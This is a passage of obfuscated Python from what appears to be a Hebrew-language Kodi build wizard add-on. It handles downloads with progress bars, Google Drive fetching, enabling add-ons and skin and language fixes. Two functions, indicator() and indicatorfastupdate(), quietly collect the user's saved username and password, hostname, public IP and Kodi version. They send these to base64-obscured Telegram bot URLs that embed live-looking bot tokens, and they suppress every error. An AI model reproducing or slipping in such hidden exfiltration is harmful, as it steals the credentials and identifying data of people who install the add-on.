          OOOOO00O0O0O0O0O0 =O0O0000O0O0OOOOOO /(time .time ()-OO00O000O0OOOO000 )#line:3491
          OOOOO00O0O0O0O0O0 =OOOOO00O0O0O0O0O0 /1024 #line:3492
        else :#line:3493
         OOOOO00O0O0O0O0O0 =0 #line:3494
        O0O000O00O0OO000O ='KB'#line:3495
        if OOOOO00O0O0O0O0O0 >=1024 :#line:3496
           OOOOO00O0O0O0O0O0 =OOOOO00O0O0O0O0O0 /1024 #line:3497
           O0O000O00O0OO000O ='MB'#line:3498
        if OOOOO00O0O0O0O0O0 >0 and not OO000OOOO00O0000O ==100 :#line:3499
            O00000OO0O0O0O000 =(OO0O0OO00O0OOOOO0 -O0O0000O0O0OOOOOO )/OOOOO00O0O0O0O0O0 #line:3500
        else :#line:3501
            O00000OO0O0O0O000 =0 #line:3502
        OOOO0O000OO0OOOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOO00O0O0O0O0O0 ,O0O000O00O0OO000O )#line:3503
        OOO0O0O000O0OO000 .update (int (OO000OOOO00O0000O ),"Downloading "+name ,O0O000OOOO00OO0OO ,OOOO0O000OO0OOOO0 )#line:3505
  O0OOO0OOOO0000OO0 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3508
  OOO00O0O00O0O00O0 .close ()#line:3510
  extract (O0000O00O000OOO00 ,O0OOO0OOOO0000OO0 ,OOO0O0O000O0OO000 )#line:3512
  if os .path .exists (O0OOO0OOOO0000OO0 +'/scakemyer-script.quasar.burst'):#line:3513
    if os .path .exists (O0OOO0OOOO0000OO0 +'/script.quasar.burst'):#line:3514
     shutil .rmtree (O0OOO0OOOO0000OO0 +'/script.quasar.burst',ignore_errors =False )#line:3515
    os .rename (O0OOO0OOOO0000OO0 +'/scakemyer-script.quasar.burst',O0OOO0OOOO0000OO0 +'/script.quasar.burst')#line:3516
  if os .path .exists (O0OOO0OOOO0000OO0 +'/plugin.video.kmediatorrent-master'):#line:3518
    if os .path .exists (O0OOO0OOOO0000OO0 +'/plugin.video.kmediatorrent'):#line:3519
     shutil .rmtree (O0OOO0OOOO0000OO0 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3520
    os .rename (O0OOO0OOOO0000OO0 +'/plugin.video.kmediatorrent-master',O0OOO0OOOO0000OO0 +'/plugin.video.kmediatorrent')#line:3521
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3522
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3523
  try :#line:3524
    os .remove (O0000O00O000OOO00 )#line:3525
  except :#line:3526
    pass #line:3527
  OOO0O0O000O0OO000 .close ()#line:3528
def dis_or_enable_addon (O0OO00OOO00OOO000 ,O00OO00O0O000O0OO ,enable ="true"):#line:3529
    import json #line:3530
    OOOO00O0O0O0O00OO ='"%s"'%O0OO00OOO00OOO000 #line:3531
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OO00OOO00OOO000 )and enable =="true":#line:3532
        logging .warning ('already Enabled')#line:3533
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0OO00OOO00OOO000 )#line:3534
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OO00OOO00OOO000 )and enable =="false":#line:3535
        return xbmc .log ("### Skipped %s, reason = not installed"%O0OO00OOO00OOO000 )#line:3536
    else :#line:3537
        O00OO000OOOO00O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOOO00O0O0O0O00OO ,enable )#line:3538
        OO0OOOO000OOO00O0 =xbmc .executeJSONRPC (O00OO000OOOO00O00 )#line:3539
        OOOOOOO0O00000O00 =json .loads (OO0OOOO000OOO00O0 )#line:3540
        if enable =="true":#line:3541
            xbmc .log ("### Enabled %s, response = %s"%(O0OO00OOO00OOO000 ,OOOOOOO0O00000O00 ))#line:3542
        else :#line:3543
            xbmc .log ("### Disabled %s, response = %s"%(O0OO00OOO00OOO000 ,OOOOOOO0O00000O00 ))#line:3544
    if O00OO00O0O000O0OO =='auto':#line:3545
     return True #line:3546
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3547
def chunk_report (OO0000O0OOO0O000O ,O000O0000O0000OO0 ,OO0OO0OOO0O0O0OO0 ):#line:3548
   O0O00OOOO0O0O0O00 =float (OO0000O0OOO0O000O )/OO0OO0OOO0O0O0OO0 #line:3549
   O0O00OOOO0O0O0O00 =round (O0O00OOOO0O0O0O00 *100 ,2 )#line:3550
   if OO0000O0OOO0O000O >=OO0OO0OOO0O0O0OO0 :#line:3552
      sys .stdout .write ('\n')#line:3553
def chunk_read (O0OOO0O0O00OO0OO0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3555
   import time #line:3556
   OO0O0OO00OO0000OO =int (filesize )*1000000 #line:3557
   OOOOO0OO0O0OO0OOO =0 #line:3559
   OOOOO000OO0O00OOO =time .time ()#line:3560
   O00O00OO000O00000 =0 #line:3561
   logging .warning ('Downloading')#line:3563
   with open (destination ,"wb")as OO0OO00OO0OOOO000 :#line:3564
    while 1 :#line:3565
      OOOO0OOO000O000O0 =time .time ()-OOOOO000OO0O00OOO #line:3566
      OOO00OOOO00O0O0O0 =int (O00O00OO000O00000 *chunk_size )#line:3567
      OO00OOOOOOO0000OO =O0OOO0O0O00OO0OO0 .read (chunk_size )#line:3568
      OO0OO00OO0OOOO000 .write (OO00OOOOOOO0000OO )#line:3569
      OO0OO00OO0OOOO000 .flush ()#line:3570
      OOOOO0OO0O0OO0OOO +=len (OO00OOOOOOO0000OO )#line:3571
      OO00OO0OO0OOOOOOO =float (OOOOO0OO0O0OO0OOO )/OO0O0OO00OO0000OO #line:3572
      OO00OO0OO0OOOOOOO =round (OO00OO0OO0OOOOOOO *100 ,2 )#line:3573
      if int (OOOO0OOO000O000O0 )>0 :#line:3574
        O0O0000OOO0O0OO0O =int (OOO00OOOO00O0O0O0 /(1024 *OOOO0OOO000O000O0 ))#line:3575
      else :#line:3576
         O0O0000OOO0O0OO0O =0 #line:3577
      if O0O0000OOO0O0OO0O >1024 and not OO00OO0OO0OOOOOOO ==100 :#line:3578
          OOO00O00000000OO0 =int (((OO0O0OO00OO0000OO -OOO00OOOO00O0O0O0 )/1024 )/(O0O0000OOO0O0OO0O ))#line:3579
      else :#line:3580
          OOO00O00000000OO0 =0 #line:3581
      if OOO00O00000000OO0 <0 :#line:3582
        OOO00O00000000OO0 =0 #line:3583
      dp .update (int (OO00OO0OO0OOOOOOO ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO00OO0OO0OOOOOOO ,OOO00OOOO00O0O0O0 /(1024 *1024 ),OO0O0OO00OO0000OO /(1000 *1000 ),O0O0000OOO0O0OO0O ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (OOO00O00000000OO0 ,60 ))#line:3584
      if dp .iscanceled ():#line:3585
         dp .close ()#line:3586
         break #line:3587
      if not OO00OOOOOOO0000OO :#line:3588
         break #line:3589
      if report_hook :#line:3591
         report_hook (OOOOO0OO0O0OO0OOO ,chunk_size ,OO0O0OO00OO0000OO )#line:3592
      O00O00OO000O00000 +=1 #line:3593
   logging .warning ('END Downloading')#line:3594
   return OOOOO0OO0O0OO0OOO #line:3595
def googledrive_download (O00OOO00OOO0OO000 ,O00OO0O0O00OOOO00 ,O00O0OOO00O0000OO ,O0O000OOOO00OO00O ):#line:3597
    OO0OOOO0O000O00OO =[]#line:3601
    O00O00OO0O0OOOO0O =O00OOO00OOO0OO000 .split ('=')#line:3602
    O00OOO00OOO0OO000 =O00O00OO0O0OOOO0O [len (O00O00OO0O0OOOO0O )-1 ]#line:3603
    def OOOO00O0O00OO00OO (O0OOO0OO0O0000O00 ):#line:3605
        for OOO000O0OOO00OOO0 in O0OOO0OO0O0000O00 :#line:3607
            logging .warning ('cookie.name')#line:3608
            logging .warning (OOO000O0OOO00OOO0 .name )#line:3609
            OOO0O0OOO0OOOOOOO =OOO000O0OOO00OOO0 .value #line:3610
            if 'download_warning'in OOO000O0OOO00OOO0 .name :#line:3611
                logging .warning (OOO000O0OOO00OOO0 .value )#line:3612
                logging .warning ('cookie.value')#line:3613
                return OOO000O0OOO00OOO0 .value #line:3614
            return OOO0O0OOO0OOOOOOO #line:3615
        return None #line:3617
    def OOOO0O0000OO0000O (O0O0OOO0O0O0O0O0O ,OO0O0OOOO0OO0000O ):#line:3619
        O00O00OO0O00OO0O0 =32768 #line:3621
        OO0O00O0OO00OO000 =time .time ()#line:3622
        with open (OO0O0OOOO0OO0000O ,"wb")as O0OO00O0OO0OOO0OO :#line:3624
            O0OO000OOOO0O0OOO =1 #line:3625
            O0OOO000O0OOOO00O =32768 #line:3626
            try :#line:3627
                O00O000OOO00000OO =int (O0O0OOO0O0O0O0O0O .headers .get ('content-length'))#line:3628
                print ('file total size :',O00O000OOO00000OO )#line:3629
            except TypeError :#line:3630
                print ('using dummy length !!!')#line:3631
                O00O000OOO00000OO =int (O0O000OOOO00OO00O )*1000000 #line:3632
            for O0OOOOO0OOOOO0O0O in O0O0OOO0O0O0O0O0O .iter_content (O00O00OO0O00OO0O0 ):#line:3633
                if O0OOOOO0OOOOO0O0O :#line:3634
                    O0OO00O0OO0OOO0OO .write (O0OOOOO0OOOOO0O0O )#line:3635
                    O0OO00O0OO0OOO0OO .flush ()#line:3636
                    OOOOOOO0O000000O0 =time .time ()-OO0O00O0OO00OO000 #line:3637
                    O0OOO00O00OOOO0OO =int (O0OO000OOOO0O0OOO *O0OOO000O0OOOO00O )#line:3638
                    if OOOOOOO0O000000O0 ==0 :#line:3639
                        OOOOOOO0O000000O0 =0.1 #line:3640
                    O0O0OOOOO0OOOOOOO =int (O0OOO00O00OOOO0OO /(1024 *OOOOOOO0O000000O0 ))#line:3641
                    OOO0OO0OO00OO00O0 =int (O0OO000OOOO0O0OOO *O0OOO000O0OOOO00O *100 /O00O000OOO00000OO )#line:3642
                    if O0O0OOOOO0OOOOOOO >1024 and not OOO0OO0OO00OO00O0 ==100 :#line:3643
                      OOO0OOOOOO0OO0000 =int (((O00O000OOO00000OO -O0OOO00O00OOOO0OO )/1024 )/(O0O0OOOOO0OOOOOOO ))#line:3644
                    else :#line:3645
                      OOO0OOOOOO0OO0000 =0 #line:3646
                    O00O0OOO00O0000OO .update (int (OOO0OO0OO00OO00O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOO0OO0OO00OO00O0 ,O0OOO00O00OOOO0OO /(1024 *1024 ),O00O000OOO00000OO /(1000 *1000 ),O0O0OOOOO0OOOOOOO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOO0OOOOOO0OO0000 ,60 ))#line:3648
                    O0OO000OOOO0O0OOO +=1 #line:3649
                    if O00O0OOO00O0000OO .iscanceled ():#line:3650
                     O00O0OOO00O0000OO .close ()#line:3651
                     break #line:3652
    O000OO000OOOO0O0O ="https://docs.google.com/uc?export=download"#line:3653
    import urllib2 #line:3658
    import cookielib #line:3659
    from cookielib import CookieJar #line:3661
    O00O000O00000O00O =CookieJar ()#line:3663
    OOOO00OO0OOOO00O0 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O00O000O00000O00O ))#line:3664
    O0O0O000O000O00OO ={'id':O00OOO00OOO0OO000 }#line:3666
    OO0OO000O0O00O0O0 =urllib .urlencode (O0O0O000O000O00OO )#line:3667
    logging .warning (O000OO000OOOO0O0O +'&'+OO0OO000O0O00O0O0 )#line:3668
    OO0OO0O0OOOOOO0O0 =OOOO00OO0OOOO00O0 .open (O000OO000OOOO0O0O +'&'+OO0OO000O0O00O0O0 )#line:3669
    OO0O0OO0OO000OO0O =OO0OO0O0OOOOOO0O0 .read ()#line:3670
    for OO0O00000OO000OO0 in O00O000O00000O00O :#line:3672
         logging .warning (OO0O00000OO000OO0 )#line:3673
    OOOOO00OO0000OOOO =OOOO00O0O00OO00OO (O00O000O00000O00O )#line:3674
    logging .warning (OOOOO00OO0000OOOO )#line:3675
    if OOOOO00OO0000OOOO :#line:3676
        OOO00OO0000OO000O ={'id':O00OOO00OOO0OO000 ,'confirm':OOOOO00OO0000OOOO }#line:3677
        O0O0O0OOO0O0O00O0 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3678
        OO0OO000O0O00O0O0 =urllib .urlencode (OOO00OO0000OO000O )#line:3679
        OO0OO0O0OOOOOO0O0 =OOOO00OO0OOOO00O0 .open (O000OO000OOOO0O0O +'&'+OO0OO000O0O00O0O0 )#line:3680
        chunk_read (OO0OO0O0OOOOOO0O0 ,report_hook =chunk_report ,dp =O00O0OOO00O0000OO ,destination =O00OO0O0O00OOOO00 ,filesize =O0O000OOOO00OO00O )#line:3681
    return (OO0OOOO0O000O00OO )#line:3685
def kodi17Fix ():#line:3686
	O0OO00O0000OO0OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3687
	OO00000000OOO0000 =[]#line:3688
	for OO000OOO000OOO00O in sorted (O0OO00O0000OO0OO0 ,key =lambda OOOOOOO0O0O0OO0O0 :OOOOOOO0O0O0OO0O0 ):#line:3689
		OOO00OO0OO0OOOO0O =os .path .join (OO000OOO000OOO00O ,'addon.xml')#line:3690
		if os .path .exists (OOO00OO0OO0OOOO0O ):#line:3691
			O0000O000OOO0OOOO =OO000OOO000OOO00O .replace (ADDONS ,'')[1 :-1 ]#line:3692
			O0000O0000OOOO000 =open (OOO00OO0OO0OOOO0O )#line:3693
			O0O00OOO00OOO0000 =O0000O0000OOOO000 .read ()#line:3694
			OOO0OOOOOO00O0O00 =parseDOM (O0O00OOO00OOO0000 ,'addon',ret ='id')#line:3695
			O0000O0000OOOO000 .close ()#line:3696
			try :#line:3697
				OO0OOO00OO00000OO =xbmcaddon .Addon (id =OOO0OOOOOO00O0O00 [0 ])#line:3698
			except :#line:3699
				try :#line:3700
					log ("%s was disabled"%OOO0OOOOOO00O0O00 [0 ],xbmc .LOGDEBUG )#line:3701
					OO00000000OOO0000 .append (OOO0OOOOOO00O0O00 [0 ])#line:3702
				except :#line:3703
					try :#line:3704
						log ("%s was disabled"%O0000O000OOO0OOOO ,xbmc .LOGDEBUG )#line:3705
						OO00000000OOO0000 .append (O0000O000OOO0OOOO )#line:3706
					except :#line:3707
						if len (OOO0OOOOOO00O0O00 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0000O000OOO0OOOO ,xbmc .LOGERROR )#line:3708
						else :log ("Unabled to enable: %s"%OO000OOO000OOO00O ,xbmc .LOGERROR )#line:3709
	if len (OO00000000OOO0000 )>0 :#line:3710
		OOOOO00O0OO000OOO =0 #line:3711
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3712
		for OO0OOOO0O0OO0OO00 in OO00000000OOO0000 :#line:3713
			OOOOO00O0OO000OOO +=1 #line:3714
			O0OO0O000O000000O =int (percentage (OOOOO00O0OO000OOO ,len (OO00000000OOO0000 )))#line:3715
			DP .update (O0OO0O000O000000O ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOOO0O0OO0OO00 ))#line:3716
			addonDatabase (OO0OOOO0O0OO0OO00 ,1 )#line:3717
			if DP .iscanceled ():break #line:3718
		if DP .iscanceled ():#line:3719
			DP .close ()#line:3720
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3721
			sys .exit ()#line:3722
		DP .close ()#line:3723
	forceUpdate ()#line:3724
def indicator ():#line:3726
       try :#line:3727
          import json #line:3728
          wiz .log ('FRESH MESSAGE')#line:3729
          OOO000O0OOOO0O000 =(ADDON .getSetting ("user"))#line:3730
          O0O0OOOOOOOO00OOO =(ADDON .getSetting ("pass"))#line:3731
          O0OOOO0OOOO000OO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3732
          O0O0OOO0O00000OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3733
          O0O00O000000OOOO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3734
          O00OO0OOOOO00OOO0 =str (json .loads (O0O00O000000OOOO0 )['ip'])#line:3735
          O0000OOOO000OOOOO =OOO000O0OOOO0O000 #line:3736
          O00O0OOO00OOOOOO0 =O0O0OOOOOOOO00OOO #line:3737
          import socket #line:3738
          O0O00O000000OOOO0 =urllib2 .urlopen (O0O0OOO0O00000OO0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0000OOOO000OOOOO +' - '+O00O0OOO00OOOOOO0 +' - '+O0OOOO0OOOO000OO0 +' - '+O00OO0OOOOO00OOO0 ).readlines ()#line:3739
       except :pass #line:3741
def indicatorfastupdate ():#line:3743
       try :#line:3744
          import json #line:3745
          wiz .log ('FRESH MESSAGE')#line:3746
          OO0000000OO0OOOO0 =(ADDON .getSetting ("user"))#line:3747
          O0O0O0OO0O0OOOO0O =(ADDON .getSetting ("pass"))#line:3748
          OO0OO00O000O0000O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3749
          O0000000O0O0O000O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3751
          O0O00O0O0O0OOO0O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3752
          O0OO0OOO00OO00O0O =str (json .loads (O0O00O0O0O0OOO0O0 )['ip'])#line:3753
          OOOO0000OOO000O0O =OO0000000OO0OOOO0 #line:3754
          OOO00O000O0O0OOOO =O0O0O0OO0O0OOOO0O #line:3755
          import socket #line:3757
          O0O00O0O0O0OOO0O0 =urllib2 .urlopen (O0000000O0O0O000O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOO0000OOO000O0O +' - '+OOO00O000O0O0OOOO +' - '+OO0OO00O000O0000O +' - '+O0OO0OOO00OO00O0O ).readlines ()#line:3758
       except :pass #line:3760
def skinfix18 ():#line:3762
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3763
		O00000O00OOOO0000 =wiz .workingURL (SKINID18DDONXML )#line:3764
		if O00000O00OOOO0000 ==True :#line:3765
			OO0OO0O00O0000OO0 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3766
			if len (OO0OO0O00O0000OO0 )>0 :#line:3767
				OOOOO00OOO000O0O0 ='%s-%s.zip'%(SKINID18 ,OO0OO0O00O0000OO0 [0 ])#line:3768
				OO0O0O0O0O0O0OO00 =wiz .workingURL (SKIN18ZIPURL +OOOOO00OOO000O0O0 )#line:3769
				if OO0O0O0O0O0O0OO00 ==True :#line:3770
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3771
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3772
					O0O00O0O000000O0O =os .path .join (PACKAGES ,OOOOO00OOO000O0O0 )#line:3773
					try :os .remove (O0O00O0O000000O0O )#line:3774
					except :pass #line:3775
					downloader .download (SKIN18ZIPURL +OOOOO00OOO000O0O0 ,O0O00O0O000000O0O ,DP )#line:3776
					extract .all (O0O00O0O000000O0O ,HOME ,DP )#line:3777
					try :#line:3778
						OO0OO00O0OO0O000O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3779
						OO0OOO00O0O0OOO00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3780
						os .rename (OO0OO00O0OO0O000O ,OO0OOO00O0O0OOO00 )#line:3781
					except :#line:3782
						pass #line:3783
					try :#line:3784
						OO0O000O0OO0O0OO0 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O0OOO0000000OOO00 =OO0O000O0OO0O0OO0 .read ();OO0O000O0OO0O0OO0 .close ()#line:3785
						O0OO0OOOO0OO0O0OO =wiz .parseDOM (O0OOO0000000OOO00 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3786
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0OOOO0OO0O0OO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3787
					except :#line:3788
						pass #line:3789
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3790
					DP .close ()#line:3791
					xbmc .sleep (500 )#line:3792
					wiz .forceUpdate (True )#line:3793
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3794
				else :#line:3795
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3796
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0O0O0O0O0O0OO00 ,xbmc .LOGERROR )#line:3797
			else :#line:3798
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3799
		else :#line:3800
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3801
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3802
def skinfix17 ():#line:3803
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3804
		OO0OO0O00OOO00O00 =wiz .workingURL (SKINID17DDONXML )#line:3805
		if OO0OO0O00OOO00O00 ==True :#line:3806
			O0OO0OO000OOO00OO =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3807
			if len (O0OO0OO000OOO00OO )>0 :#line:3808
				OOO00OO0OO00OO0OO ='%s-%s.zip'%(SKINID17 ,O0OO0OO000OOO00OO [0 ])#line:3809
				O00000OOOOO0OO0OO =wiz .workingURL (SKIN17ZIPURL +OOO00OO0OO00OO0OO )#line:3810
				if O00000OOOOO0OO0OO ==True :#line:3811
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3812
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3813
					O0000OOOOO0000O0O =os .path .join (PACKAGES ,OOO00OO0OO00OO0OO )#line:3814
					try :os .remove (O0000OOOOO0000O0O )#line:3815
					except :pass #line:3816
					downloader .download (SKIN17ZIPURL +OOO00OO0OO00OO0OO ,O0000OOOOO0000O0O ,DP )#line:3817
					extract .all (O0000OOOOO0000O0O ,HOME ,DP )#line:3818
					try :#line:3819
						O00O0OO00O0OO00O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3820
						OO000O000OO0000OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3821
						os .rename (O00O0OO00O0OO00O0 ,OO000O000OO0000OO )#line:3822
					except :#line:3823
						pass #line:3824
					try :#line:3825
						O00OOO0O00OO00000 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O0O0OO0OOOO00O00O =O00OOO0O00OO00000 .read ();O00OOO0O00OO00000 .close ()#line:3826
						OOOOOOOOOOO0000O0 =wiz .parseDOM (O0O0OO0OOOO00O00O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3827
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOOOOOOO0000O0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3828
					except :#line:3829
						pass #line:3830
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3831
					DP .close ()#line:3832
					xbmc .sleep (500 )#line:3833
					wiz .forceUpdate (True )#line:3834
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3835
				else :#line:3836
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3837
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O00000OOOOO0OO0OO ,xbmc .LOGERROR )#line:3838
			else :#line:3839
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3840
		else :#line:3841
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3842
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3843
def fix17update ():#line:3844
	if KODIV >=17 and KODIV <18 :#line:3845
		wiz .kodi17Fix ()#line:3846
		xbmc .sleep (4000 )#line:3847
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3848
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3849
		fixfont ()#line:3850
		O000O0O0000OO00OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3851
		try :#line:3853
			O00000OO0OOO0OO00 =open (O000O0O0000OO00OO ,'r')#line:3854
			OO0O0OOOOOO0O0O00 =O00000OO0OOO0OO00 .read ()#line:3855
			O00000OO0OOO0OO00 .close ()#line:3856
			O00O0O000OOO0OOO0 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3857
			O00OO0OO0OOO0O00O =re .compile (O00O0O000OOO0OOO0 ).findall (OO0O0OOOOOO0O0O00 )[0 ]#line:3858
			O00000OO0OOO0OO00 =open (O000O0O0000OO00OO ,'w')#line:3859
			O00000OO0OOO0OO00 .write (OO0O0OOOOOO0O0O00 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O00OO0OO0OOO0O00O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3860
			O00000OO0OOO0OO00 .close ()#line:3861
		except :#line:3862
				pass #line:3863
		wiz .kodi17Fix ()#line:3864
		O000O0O0000OO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3865
		try :#line:3866
			O00000OO0OOO0OO00 =open (O000O0O0000OO00OO ,'r')#line:3867
			OO0O0OOOOOO0O0O00 =O00000OO0OOO0OO00 .read ()#line:3868
			O00000OO0OOO0OO00 .close ()#line:3869
			O00O0O000OOO0OOO0 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3870
			O00OO0OO0OOO0O00O =re .compile (O00O0O000OOO0OOO0 ).findall (OO0O0OOOOOO0O0O00 )[0 ]#line:3871
			O00000OO0OOO0OO00 =open (O000O0O0000OO00OO ,'w')#line:3872
			O00000OO0OOO0OO00 .write (OO0O0OOOOOO0O0O00 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O00OO0OO0OOO0O00O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3873
			O00000OO0OOO0OO00 .close ()#line:3874
		except :#line:3875
				pass #line:3876
		swapSkins ('skin.Premium.mod')#line:3877
def fix18update ():#line:3879
	if KODIV >=18 :#line:3880
		xbmc .sleep (4000 )#line:3881
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3882
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3883
		fixfont ()#line:3884
		O0OOO000O0O00OO0O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3885
		try :#line:3886
			OOO0O000OO00O0OO0 =open (O0OOO000O0O00OO0O ,'r')#line:3887
			O0O0O0O0O00O0O0O0 =OOO0O000OO00O0OO0 .read ()#line:3888
			OOO0O000OO00O0OO0 .close ()#line:3889
			O0OOO000OO00O00OO ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3890
			O0OOOOOO000OO0O0O =re .compile (O0OOO000OO00O00OO ).findall (O0O0O0O0O00O0O0O0 )[0 ]#line:3891
			OOO0O000OO00O0OO0 =open (O0OOO000O0O00OO0O ,'w')#line:3892
			OOO0O000OO00O0OO0 .write (O0O0O0O0O00O0O0O0 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0OOOOOO000OO0O0O ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3893
			OOO0O000OO00O0OO0 .close ()#line:3894
		except :#line:3895
				pass #line:3896
		wiz .kodi17Fix ()#line:3897
		O0OOO000O0O00OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3898
